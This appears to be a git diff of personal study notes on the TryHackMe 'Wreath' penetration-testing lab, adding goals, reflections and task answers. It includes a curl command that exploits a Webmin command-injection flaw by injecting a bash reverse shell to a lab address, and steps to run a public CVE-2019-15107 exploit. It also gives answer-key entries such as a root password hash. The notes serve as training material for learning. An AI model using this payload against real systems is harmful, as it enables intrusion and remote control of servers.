@@ -6,9 +6,17 @@ Name: Wreath
 Date:  
 Difficulty:  
 Goals:  
-- Masscan does miss - Check on the naabu / rustscan alternative question again 
+- Solidify Pivoting skills
+- PWK HERE WE GO!
+- 
 Learnt:
+- Masscan does miss - Check on the naabu / rustscan alternative question again 
+- Flexing changing it up and feeling good while flexing changing up on the fly!
+- Making python virtual environments is just that easy
+- Thomas Wreath is as haunting as Alh4zr3d described.
 Beyond Root:
+- Do the report like a professional
+- Prep reporting for further Offsec certs 2023!
 
 - [[Wreath-Notes.md]]
 - [[Wreath-CMD-by-CMDs.md]]
@@ -109,23 +117,43 @@ So we do need to worry about python virtual environments for compatibility
 curl  -k https://10.200.96.200:10000/password_change.cgi -d 'user=gotroot&pam=&expired=2|echo ""; bash -i >& /dev/tcp/10.50.76.121/10000 0>&1' -H 'Referer: https://10.200.96.200:10000/session_login.cgi'
 ```
 
-Muirland also has an exploit to use - a better way to do this would be to create a virtual environment
+[Muirland also has provided an exploit to use](https://github.com/MuirlandOracle/CVE-2019-15107) - a better way to do this would be to create a virtual environment
 ```bash
 git clone https://github.com/MuirlandOracle/CVE-2019-15107
 cd CVE-2019-15107 
 python3 -m venv .venv
 source .venv/bin/activate
-
 pip3 install .
+python3 CVE-2019-15107.py $IP
 ```
-
-
 
 #### Task 6 Webserver Exploitation
 
-#### Task 7 Pivoting What is Pivoting?
+Which user was the server running as?
+```
+root
+```
 
+What is the root user's password hash?
+```
+$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1
+```
+
+What is the full path to this file?
+```
+/root/.ssh/id_rsa
+```
 #### Task 8 Pivoting High-level Overview
+
+Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?  
+```
+Tunneling
+```
+
+**Research:** Not covered in this Network, but good to know about. Which Metasploit Framework Meterpreter command can be used to create a port forward?
+```
+portfwd
+```
 
 #### Task 9 Pivoting Enumeration
 
